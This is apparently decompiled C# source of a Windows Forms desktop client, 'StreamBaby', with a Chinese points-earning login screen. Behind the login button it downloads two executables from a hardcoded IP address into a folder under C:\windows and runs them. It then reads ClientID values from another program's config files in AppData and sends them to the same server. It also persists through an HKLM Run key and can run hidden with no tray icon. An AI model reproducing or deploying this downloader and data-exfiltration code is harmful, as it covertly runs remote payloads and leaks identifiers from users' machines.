using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using Microsoft.Win32;

namespace StreamBaby;

public class MainForm : Form
{
	private string exe1Path = string.Empty;

	private string exe2Path = string.Empty;

	private string configPath = string.Empty;

	private bool isAutoRun = false;

	private bool isVisiable = true;

	private bool isLogin = false;

	private IContainer components = null;

	private Label label1;

	private TextBox txtUserName;

	private Button btnLogin;

	private GroupBox groupBox1;

	private Label label3;

	private LinkLabel linkLabel1;

	private CheckBox chkAutoRun;

	private Label label2;

	private NotifyIcon notifyIcon1;

	private ContextMenuStrip contextMenuStrip1;

	private ToolStripMenuItem toolStripMenuItem_0;

	private ToolStripMenuItem toolStripMenuItem_1;

	private Label lblCurrent;

	private Label lblTime;

	public MainForm()
	{
		InitializeComponent();
		Control.set_CheckForIllegalCrossThreadCalls(false);
	}

	private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
	}

	private void btnLogin_Click(object sender, EventArgs e)
	{
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		if (!string.IsNullOrEmpty(((Control)txtUserName).get_Text().Trim()))
		{
			isLogin = true;
			try
			{
				Thread thread = new Thread(BrowseRun);
				thread.IsBackground = true;
				thread.Start();
				Thread thread2 = new Thread(UpdateUI);
				thread2.IsBackground = true;
				thread2.Start();
				((Control)btnLogin).set_Enabled(false);
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}
	}

	private void BrowseRun()
	{
		SaveInfo();
		string text = Path.Combine("C:\\windows\\duoduozhuan", "Browse task.exe");
		string text2 = Path.Combine("C:\\windows\\duoduozhuan", "Receiving task.exe");
		if (!Directory.Exists("C:\\windows\\duoduozhuan"))
		{
			Directory.CreateDirectory("C:\\windows\\duoduozhuan");
		}
		Thread.Sleep(2000);
		try
		{
			string address = "http://123.57.239.185/UpDo.ashx?type=down&key=1";
			WebClient webClient = new WebClient();
			webClient.Encoding = Encoding.UTF8;
			byte[] bytes = webClient.DownloadData(address);
			File.WriteAllBytes(text, bytes);
		}
		catch
		{
		}
		try
		{
			string address = "http://123.57.239.185/UpDo.ashx?type=down&key=2";
			WebClient webClient = new WebClient();
			webClient.Encoding = Encoding.UTF8;
			byte[] bytes = webClient.DownloadData(address);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		Thread.Sleep(500);
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = text;
			Process.Start(processStartInfo);
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			processStartInfo2.FileName = text2;
			Process.Start(processStartInfo2);
		}
		catch
		{
		}
		Thread.Sleep(10000);
		try
		{
			ReadFileAndUpload();
		}
		catch
		{
		}
	}

	private void ReadFileAndUpload()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string text = Path.Combine(Path.Combine(folderPath, "DDZHUANPro"), "cfg.ini");
		string text2 = Path.Combine(Path.Combine(folderPath, "DDZHUANPre"), "cfg.ini");
		((Control)txtUserName).get_Text().Trim();
		string[] array = new string[2] { text, text2 };
		WebClient webClient = new WebClient();
		webClient.Encoding = Encoding.UTF8;
		string[] array2 = array;
		foreach (string text3 in array2)
		{
			if (File.Exists(text3))
			{
				IniFiles iniFiles = new IniFiles(text3);
				string text4 = iniFiles.ReadString("User Configuration", "ClientID", "");
				char[] trimChars = new char[1];
				string arg = text4.Trim(trimChars);
				try
				{
					webClient.DownloadString($"http://123.57.239.185/UpDo.ashx?type=add&userName={HttpUtility.UrlEncode(((Control)txtUserName).get_Text())}&clientId={arg}");
				}
				catch
				{
				}
			}
		}
	}

	private void MainForm_Load(object sender, EventArgs e)
	{
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "data.data");
		if (File.Exists(path))
		{
			string[] array = File.ReadAllLines(path, Encoding.UTF8);
			string[] array2 = array;
			foreach (string text in array2)
			{
				string[] array3 = text.Split(new char[1] { '=' }, StringSplitOptions.RemoveEmptyEntries);
				if (array3.Length == 2)
				{
					dictionary.Add(array3[0], array3[1]);
				}
			}
		}
		if (dictionary.ContainsKey("UserName"))
		{
			((Control)txtUserName).set_Text(dictionary["UserName"]);
		}
		if (!string.IsNullOrEmpty(((Control)txtUserName).get_Text().Trim()))
		{
			((TextBoxBase)txtUserName).set_ReadOnly(true);
		}
		if (dictionary.ContainsKey("IsAutoRun"))
		{
			chkAutoRun.set_Checked(dictionary["IsAutoRun"] == "1");
		}
		if (dictionary.ContainsKey("IsVisiable"))
		{
			isVisiable = dictionary["IsVisiable"] == "1";
		}
		try
		{
			HotKey.RegisterHotKey(((Control)this).get_Handle(), 100, HotKey.KeyModifiers.Alt | HotKey.KeyModifiers.Ctrl, (Keys)87);
		}
		catch
		{
			MessageBox.Show("热键冲突，开启失败！");
		}
		DateTime now = DateTime.Now;
		while (!NetworkInterface.GetIsNetworkAvailable())
		{
			Thread.Sleep(1000);
			if (now.AddSeconds(5.0) < DateTime.Now)
			{
				break;
			}
		}
		if (!isVisiable)
		{
			((Control)this).Hide();
			notifyIcon1.set_Visible(false);
		}
		Thread thread = new Thread(ExecuteButton);
		thread.IsBackground = true;
		thread.Start();
	}

	private void ExecuteButton()
	{
		try
		{
			if (!string.IsNullOrEmpty(((Control)txtUserName).get_Text()))
			{
				btnLogin_Click(btnLogin, new EventArgs());
			}
		}
		catch
		{
		}
	}

	private void UpdateUI()
	{
		while (true)
		{
			try
			{
				string address = "http://123.57.239.185/UpDo.ashx?type=getusercode&name=" + ((Control)txtUserName).get_Text();
				WebClient webClient = new WebClient();
				webClient.Encoding = Encoding.UTF8;
				string text = webClient.DownloadString(address);
				string[] array = text.Split(new char[1] { ',' }, StringSplitOptions.RemoveEmptyEntries);
				if (array.Length == 1)
				{
					((Control)lblCurrent).set_Text("积分：" + array[0]);
					((Control)lblTime).set_Text("更新时间:" + DateTime.Now.ToString("yyyy-MM-dd HH:mm"));
					continue;
				}
				Label obj = lblCurrent;
				string text2;
				((Control)lblCurrent).set_Text(text2 = "积分:" + array[0]);
				((Control)obj).set_Text(text2);
				((Control)lblTime).set_Text("更新时间:" + array[1]);
			}
			catch
			{
			}
			finally
			{
				Thread.Sleep(600000);
			}
		}
	}

	public static void SetAutoRun(string fileName, bool isAutoRun)
	{
		RegistryKey registryKey = null;
		try
		{
			if (File.Exists(fileName))
			{
				string name = fileName.Substring(fileName.LastIndexOf("\\") + 1);
				registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				if (registryKey == null)
				{
					registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
				}
				if (isAutoRun)
				{
					registryKey.SetValue(name, fileName);
				}
				else
				{
					registryKey.SetValue(name, false);
				}
			}
		}
		catch (Exception)
		{
		}
		finally
		{
			registryKey?.Close();
		}
	}

	private void chkAutoRun_CheckedChanged(object sender, EventArgs e)
	{
		SetAutoRun(Application.get_ExecutablePath(), chkAutoRun.get_Checked());
		isAutoRun = chkAutoRun.get_Checked();
	}

	protected override void WndProc(ref Message m)
	{
		int msg = ((Message)(ref m)).get_Msg();
		if (msg == 786)
		{
			msg = ((Message)(ref m)).get_WParam().ToInt32();
			if (msg == 100)
			{
				((Control)this).set_Visible(!((Control)this).get_Visible());
				notifyIcon1.set_Visible(((Control)this).get_Visible());
				isVisiable = ((Control)this).get_Visible();
				if (isLogin)
				{
					isVisiable = ((Control)this).get_Visible();
					SaveInfo();
				}
			}
		}
		((Form)this).WndProc(ref m);
	}

	private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
	{
		((Control)this).Hide();
		notifyIcon1.set_Visible(true);
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void toolStripMenuItem_0_Click(object sender, EventArgs e)
	{
		((Control)this).Show();
		notifyIcon1.set_Visible(false);
	}

	private void toolStripMenuItem_1_Click(object sender, EventArgs e)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Invalid comparison between Unknown and I4
		if ((int)MessageBox.Show("确定退出吗？", "提示", (MessageBoxButtons)1) != 1)
		{
			return;
		}
		try
		{
			HotKey.RegisterHotKey(((Control)this).get_Handle(), 100, HotKey.KeyModifiers.Alt | HotKey.KeyModifiers.Ctrl, (Keys)83);
		}
		catch
		{
		}
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.MainModule!.FileName!.ToLower().Contains("browse task.exe") || process.MainModule!.FileName!.ToLower().Contains("receiving task.exe"))
				{
					process.Kill();
				}
			}
			catch
			{
			}
		}
		Application.ExitThread();
		Application.Exit();
	}

	private void SaveInfo()
	{
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		dictionary.Add("UserName", ((Control)txtUserName).get_Text().Trim());
		dictionary.Add("IsAutoRun", chkAutoRun.get_Checked() ? "1" : "0");
		dictionary.Add("IsVisiable", isVisiable ? "1" : "0");
		StringBuilder stringBuilder = new StringBuilder();
		foreach (KeyValuePair<string, string> item in dictionary)
		{
			stringBuilder.AppendFormat("{0}={1}\r\n", item.Key, item.Value);
		}
		File.WriteAllText(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "data.data"), stringBuilder.ToString(), Encoding.UTF8);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_0536: Unknown result type (might be due to invalid IL or missing references)
		//IL_0540: Expected O, but got Unknown
		//IL_05d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_05de: Expected O, but got Unknown
		//IL_071c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0726: Expected O, but got Unknown
		//IL_0739: Unknown result type (might be due to invalid IL or missing references)
		//IL_0743: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
		label1 = new Label();
		txtUserName = new TextBox();
		btnLogin = new Button();
		groupBox1 = new GroupBox();
		lblTime = new Label();
		lblCurrent = new Label();
		label2 = new Label();
		chkAutoRun = new CheckBox();
		linkLabel1 = new LinkLabel();
		label3 = new Label();
		notifyIcon1 = new NotifyIcon(components);
		contextMenuStrip1 = new ContextMenuStrip(components);
		toolStripMenuItem_0 = new ToolStripMenuItem();
		toolStripMenuItem_1 = new ToolStripMenuItem();
		((Control)groupBox1).SuspendLayout();
		((Control)contextMenuStrip1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(6, 29));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(41, 12));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("工号：");
		((Control)txtUserName).set_Location(new Point(56, 26));
		((Control)txtUserName).set_Name("txtUserName");
		((Control)txtUserName).set_Size(new Size(121, 21));
		((Control)txtUserName).set_TabIndex(1);
		((Control)btnLogin).set_Location(new Point(190, 24));
		((Control)btnLogin).set_Name("btnLogin");
		((Control)btnLogin).set_Size(new Size(57, 23));
		((Control)btnLogin).set_TabIndex(2);
		((Control)btnLogin).set_Text("登 录");
		((ButtonBase)btnLogin).set_UseVisualStyleBackColor(true);
		((Control)btnLogin).add_Click((EventHandler)btnLogin_Click);
		((Control)groupBox1).get_Controls().Add((Control)(object)lblTime);
		((Control)groupBox1).get_Controls().Add((Control)(object)lblCurrent);
		((Control)groupBox1).get_Controls().Add((Control)(object)label2);
		((Control)groupBox1).get_Controls().Add((Control)(object)chkAutoRun);
		((Control)groupBox1).get_Controls().Add((Control)(object)linkLabel1);
		((Control)groupBox1).get_Controls().Add((Control)(object)label3);
		((Control)groupBox1).get_Controls().Add((Control)(object)label1);
		((Control)groupBox1).get_Controls().Add((Control)(object)btnLogin);
		((Control)groupBox1).get_Controls().Add((Control)(object)txtUserName);
		((Control)groupBox1).set_Location(new Point(9, 10));
		((Control)groupBox1).set_Name("groupBox1");
		((Control)groupBox1).set_Size(new Size(256, 147));
		((Control)groupBox1).set_TabIndex(3);
		groupBox1.set_TabStop(false);
		((Control)groupBox1).set_Text("工号登录");
		((Control)lblTime).set_AutoSize(true);
		((Control)lblTime).set_Location(new Point(68, 97));
		((Control)lblTime).set_Name("lblTime");
		((Control)lblTime).set_Size(new Size(0, 12));
		((Control)lblTime).set_TabIndex(8);
		((Control)lblCurrent).set_AutoSize(true);
		((Control)lblCurrent).set_Location(new Point(68, 78));
		((Control)lblCurrent).set_Name("lblCurrent");
		((Control)lblCurrent).set_Size(new Size(11, 12));
		((Control)lblCurrent).set_TabIndex(8);
		((Control)lblCurrent).set_Text("0");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(10, 57));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(131, 12));
		((Control)label2).set_TabIndex(7);
		((Control)label2).set_Text("Ctrl+Alt+W(显示/隐藏)");
		((Control)chkAutoRun).set_AutoSize(true);
		((Control)chkAutoRun).set_Location(new Point(182, 54));
		((Control)chkAutoRun).set_Name("chkAutoRun");
		((Control)chkAutoRun).set_Size(new Size(72, 16));
		((Control)chkAutoRun).set_TabIndex(6);
		((Control)chkAutoRun).set_Text("开机启动");
		((ButtonBase)chkAutoRun).set_UseVisualStyleBackColor(true);
		chkAutoRun.add_CheckedChanged((EventHandler)chkAutoRun_CheckedChanged);
		((Control)linkLabel1).set_AutoSize(true);
		((Control)linkLabel1).set_Location(new Point(8, 78));
		((Control)linkLabel1).set_Name("linkLabel1");
		((Control)linkLabel1).set_Size(new Size(53, 12));
		((Control)linkLabel1).set_TabIndex(5);
		((Label)linkLabel1).set_TabStop(true);
		((Control)linkLabel1).set_Text("今日赚分");
		linkLabel1.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkLabel1_LinkClicked));
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_ForeColor(Color.Green);
		((Control)label3).set_Location(new Point(7, 113));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(245, 24));
		((Control)label3).set_TabIndex(4);
		((Control)label3).set_Text("每天凌晨结算积分，实际积分请以结算后为准\r\n，全世界IP都可以挂机");
		notifyIcon1.set_ContextMenuStrip(contextMenuStrip1);
		notifyIcon1.set_Icon((Icon)componentResourceManager.GetObject("notifyIcon1.Icon"));
		notifyIcon1.set_Visible(true);
		((ToolStrip)contextMenuStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)toolStripMenuItem_0,
			(ToolStripItem)toolStripMenuItem_1
		});
		((Control)contextMenuStrip1).set_Name("contextMenuStrip1");
		((Control)contextMenuStrip1).set_Size(new Size(101, 48));
		((ToolStripItem)toolStripMenuItem_0).set_Name("退出ToolStripMenuItem");
		((ToolStripItem)toolStripMenuItem_0).set_Size(new Size(100, 22));
		((ToolStripItem)toolStripMenuItem_0).set_Text("显示");
		((ToolStripItem)toolStripMenuItem_0).add_Click((EventHandler)toolStripMenuItem_0_Click);
		((ToolStripItem)toolStripMenuItem_1).set_Name("显示ToolStripMenuItem");
		((ToolStripItem)toolStripMenuItem_1).set_Size(new Size(100, 22));
		((ToolStripItem)toolStripMenuItem_1).set_Text("退出");
		((ToolStripItem)toolStripMenuItem_1).add_Click((EventHandler)toolStripMenuItem_1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(271, 160));
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("MainForm");
		((Form)this).add_FormClosing(new FormClosingEventHandler(MainForm_FormClosing));
		((Form)this).add_Load((EventHandler)MainForm_Load);
		((Control)groupBox1).ResumeLayout(false);
		((Control)groupBox1).PerformLayout();
		((Control)contextMenuStrip1).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
	}
}
